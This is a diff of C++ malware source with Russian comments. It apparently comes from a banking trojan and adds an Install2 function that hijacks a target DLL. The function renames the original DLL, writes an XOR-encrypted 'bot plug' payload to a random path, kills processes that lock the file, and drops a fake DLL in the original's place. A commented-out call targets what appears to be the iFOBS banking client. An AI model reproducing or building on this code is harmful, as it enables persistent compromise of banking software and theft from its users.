@@ -395,7 +395,6 @@ bool SelectTargetIeDll(
 // Если не получается получить - возвращает NULL
 LPVOID GetBuiltinFakeDllBody(DWORD & Size)
 {
-	//return File::ReadToBufferA("fake.dll", Size);
 	LPVOID buf;
 	bool bufAlloc;
 	if( TMemoryDLL::DecodeDll( fakeDllData, Size, buf, bufAlloc ) )
@@ -610,6 +609,70 @@ extern "C" BOOL WINAPI Install( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	return res;
 }
 
+//подменяет длл путь к которой fakeDll
+extern "C" BOOL WINAPI Install2( const char* fakeDll, BYTE* bodyBotPlug, DWORD sizeBotPlug )
+{
+	BOOL ret = FALSE;
+	char origDll[MAX_PATH]; //путь куда сохраняется оригинальная длл
+	m_lstrcpy( origDll, fakeDll );
+	//смещаем расширение на один символ вправо
+	int p = m_lstrlen(origDll);
+	origDll[p + 1] = 0;
+	do
+	{
+		origDll[p] = origDll[p - 1];
+		p--;
+	} while( origDll[p] != '.' );
+	//добавляем любую цифру к имени длл
+	for( int i = 0; i < 10; i++ )
+	{
+		origDll[p] = ((DWORD)pGetTickCount() % 10) + '0';
+		//если такая есть, то пробуем ставить другую цифру
+		if( !File::IsExists(origDll) )
+		{
+			p = -1; //такого файла нет
+			break; 
+		}
+	}
+	if( p >= 0 ) //создать имя не удалось
+	{
+		return FALSE;
+	}
+	FAKEDLLDBG( "InstallFakeDll", "Подмена %s -> %s", fakeDll, origDll );
+	GUID CryptKey = GenerateCryptKey();
+	XorCrypt( (LPBYTE)&CryptKey, sizeof(GUID), bodyBotPlug, sizeBotPlug );
+	wstring botPlugPath;
+	GenerateRandomPlugPath(botPlugPath); //путь к бот плагу
+	DWORD writen = File::WriteBufferW( botPlugPath.t_str(), bodyBotPlug, sizeBotPlug );
+	if( writen != sizeBotPlug ) return FALSE;
+	FAKEDLLDBG( "InstallFakeDll", "bot.plug saved '%ls'", botPlugPath.t_str() );
+	DWORD  fakeDllSize = 0;
+	LPVOID fakeDllBody = GetBuiltinFakeDllBody(fakeDllSize);
+	if( fakeDllBody == 0 ) return FALSE;
+	wchar_t* worigDll = AnsiToUnicode( origDll, 0 );
+	wstring worigDll2(worigDll);
+	MemFree(worigDll);
+	BYTE* fakeDllBody2 = CreateFakeDllWithBuiltingSettings( CryptKey, worigDll2, botPlugPath, fakeDllBody, fakeDllSize );
+	if( fakeDllBody2 )
+	{
+		char fakeDll2[MAX_PATH];
+		m_lstrcpy( fakeDll2, fakeDll );
+		StrLowerCase(fakeDll2);
+		KillBlockingProcesses(fakeDll2);
+		if( pMoveFileA( fakeDll2, origDll ) )
+		{
+			if( File::WriteBufferA( fakeDll2, fakeDllBody2, fakeDllSize ) == fakeDllSize )
+			{
+				FAKEDLLDBG( "InstallFakeDll", "fake.dll installed" );
+				ret = TRUE;
+			}
+		}
+		MemFree(fakeDllBody2);
+	}
+	MemFree(fakeDllBody);
+	return ret;
+}
+
 #pragma comment(linker, "/ENTRY:FakeDllInstallerDllMain" )
 
 DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
@@ -623,6 +686,7 @@ DWORD WINAPI FakeDllInstallerDllMain(HINSTANCE , DWORD reason, LPVOID )
 	{
 		case DLL_PROCESS_ATTACH:
 //			Install( data, size );
+//			Install2( "c:\\ifobs2\\nkicnt.dll", data, size );
 			break;
 		case DLL_THREAD_ATTACH:
 		case DLL_THREAD_DETACH:
